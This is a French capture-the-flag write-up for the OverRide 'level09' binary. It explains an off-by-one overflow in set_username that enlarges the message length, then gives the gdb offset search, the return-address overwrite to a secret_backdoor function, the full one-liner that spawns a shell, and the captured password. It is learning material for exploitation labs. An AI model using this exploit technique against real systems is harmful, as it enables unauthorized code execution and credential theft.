On arrive sur un niveau qui demande un username et un message en prompt : 

level09@OverRide:~$ ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: felix
>: Welcome, felix
>: Msg @Unix-Dude
>>: coucou
>: Msg sent!

Le programme appele une fonction set_username puis une fonctions set_msg avant de exit.

Avec gihdra on comprends qu'une structure message est utilisee.
Cette structure a trois variables, dans l'ordre le message, l'username, et la taille du message.
Par default la taille du message est de 140 ( l'ancienne limite de twitter)

Le probleme du programme reside dans set_username.
L'username a une taille maximale de 40 en theorie, mais la boucle qui rempli la structure fait un charactere de plus.

Set_username ecrira le 41e charactere a la place de la taille du message.

On peut donc faire segfault le programme en augmentant la taille du message!

On remarque aussi une fonction inutilisee "secret_backdoor" qui appele system !

Grace au segfault on va aller a son adresse! 

On va creer un payload suivant : 

message | 250 ( ecrasement de la taille du message dans la structure) | retour ligne | string de 300 

Et voir ou on segfault avec gdb.

(gdb) r< <$(python -c 'print "B"*40 + "\xfa" + "\n" + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"')

--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!

Program received signal SIGSEGV, Segmentation fault.
0x0000555555554931 in handle_msg ()
Le programme segfault a la fin du handle_msg.

en faisant x/s sur les registres on voit sur rbp : 

rbp            0x4141414141414141	0x4141414141414141

On va essayer de trouver l'offset avec une string on va essayer la string construite sur un generator 
(gdb) r< <(python -c 'print "A"*40 + "\xfa" + "\n" + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9"')

on trouve un offset de 192 sur rbp, auquel il faut rajouter 8 pour arriver sur eip ( rip ici en 64b), donc 200 de padding avant payload.

Cela se voit sur l'assembleur:

   0x00005555555548c0 <+0>:	push   %rbp    << 8
   0x00005555555548c1 <+1>:	mov    %rsp,%rbp 
   0x00005555555548c4 <+4>:	sub    $0xc0,%rsp  << 192 

Plus qu'a trouver l'adresse de "secret_backdoor"

disas secret_backdoor : 0x000055555555488c premiere instruction 
\x8c\x48\x55\x55\x55\x55\x00\x00 en little endian.

level09@OverRide:~$ ./level09 < <(python -c 'print "B"*40 + "\xfa" + "\n" + "A"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"')
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB�>: Msg @Unix-Dude
>>: >: Msg sent!
sh: 1: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA: not found

Il va falloir trouver le bon parametre pour appeler /bin/sh

./level09 < <(python -c 'print "B"*40 + "\xfa" + "\n" + "A"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "/bin/sh" '  )
sh: 1: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA: not found

Il faut lancer le programme avec cat comme on avait fait sur des niveaux precedents et/ou rainfall, et rajouter un \n avant /bin/sh pour utiliser stdin.

level09@OverRide:~$ (python -c 'print "B"*40 + "\xfa" + "\n" + "A"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"  + "\n" +  "/bin/sh" '; cat ) | ./level09
cat /home/users/end/.pass

j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE

sources : https://wiremask.eu/tools/buffer-overflow-pattern-generator/?